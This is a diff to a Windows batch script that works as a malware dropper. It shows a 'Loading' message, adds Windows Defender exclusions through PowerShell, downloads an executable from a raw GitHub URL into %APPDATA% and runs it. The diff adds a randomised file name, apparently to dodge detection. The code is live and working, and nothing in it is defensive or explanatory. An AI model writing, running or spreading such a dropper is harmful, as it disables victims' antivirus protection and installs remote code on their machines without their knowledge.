@@ -27,10 +27,14 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------
 echo Loading.... Don't close this windown
-powershell.exe -Command "Set-MpPreference -ExclusionProcess installer_plus_v1.exe"
-powershell.exe -Command "Add-MpPreference -ExclusionPath %APPDATA%\installer_plus_v1.exe"
+set "base_filename=installer"
+set "random_suffix=%RANDOM%"
+set "final_filename=%base_filename%_%random_suffix%.exe"
+
+powershell.exe -Command "Set-MpPreference -ExclusionProcess  '%final_filename%'"
+powershell.exe -Command "Add-MpPreference -ExclusionPath '%APPDATA%\\%final_filename%'"
 ::cd %TEMP%
 cd %APPDATA%
-Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/tt92threestick/tt_net/refs/heads/main/installer.exe' -OutFile '%APPDATA%\installer_plus_v1.exe'"
-"%APPDATA%\installer_plus_v1.exe"
+Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/tt92threestick/tt_net/refs/heads/main/installer.exe' -OutFile '%APPDATA%\\%final_filename%'"
+"%APPDATA%\\%final_filename%"
 exit
